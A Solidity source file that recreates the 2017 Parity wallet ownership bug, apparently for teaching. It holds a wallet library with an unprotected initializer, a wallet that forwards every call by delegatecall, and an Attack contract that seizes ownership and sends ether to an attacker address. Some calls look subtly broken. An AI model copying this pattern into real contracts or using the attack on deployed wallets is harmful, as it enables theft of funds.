
pragma solidity 0.4.18; 

//https://hackingdistributed.com/2017/07/22/deep-dive-parity-bug/

contract WalletLibrary {
     address owner;

     // called by constructor
     function initWallet(address _owner) public {
         owner = _owner;
     
     }

     function changeOwner(address _new_owner) external {
         if (msg.sender == owner) {
             owner = _new_owner;
         }
     }
     
     function getOwner() public view returns(address) {
         return owner;
     }

     function () payable {
       
     }

     function withdraw(uint amount) external returns (bool success) {
         if (msg.sender == owner) {
             return owner.send(amount);
         } else {
             return false;
         }
     }
}

contract Wallet {
    address owner;
    address _walletLibrary;

    function Wallet(address _owner, address walletLibrary) {
        // replace the following line with “_walletLibrary = new WalletLibrary();”
        // if you want to try to exploit this contract in Remix.
        _walletLibrary = walletLibrary;
        _walletLibrary = WalletLibrary(walletLibrary);//walletLibrary;//<address of pre-deployed WalletLibrary>;
        _walletLibrary.delegatecall(bytes4(sha3("initWallet(address)")), _owner);
    }
    
      function getOwner() public view returns(address) {
         return owner;
     }

    function withdraw(uint amount) returns (bool success) {
        return _walletLibrary.delegatecall(bytes4(sha3("withdraw(uint)")), amount);
    }

    // fallback function gets called if no other function matches call
    function () public payable  {
        _walletLibrary.delegatecall(msg.data);
    }
}


contract Attack  { 
   
    address  attackerAddress;
    address walletAddress;

    function Attack(address _walletAddress, address  _attackerAddress)  { 
        
        walletAddress = _walletAddress;
        attackerAddress = _attackerAddress; 
    }
    
     function setOwner(address owner) external {
         //will hit callback and set address vib lib contract
       walletAddress.delegatecall(bytes4(sha3("initWallet(address)", owner) ));
     }
     
      function() public payable {
         attackerAddress.transfer(address(this).balance);
     }
      

    
}